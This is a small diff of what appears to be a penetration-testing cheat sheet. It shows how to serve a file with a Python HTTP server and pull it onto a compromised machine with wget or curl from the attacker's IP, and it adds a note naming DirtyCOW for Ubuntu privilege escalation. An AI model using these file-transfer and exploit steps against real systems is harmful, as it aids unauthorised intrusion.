@@ -39,6 +39,4 @@ _> python -m http.server 80 # in same dir in which you download the script
 -> In Attacker Side 
 _> cd /tmp
 _> wget/curl <ip_of_my>/<file_name>*
-
-
-
+_> DirtyCOw -> Ubuntu version exploit and sudo too
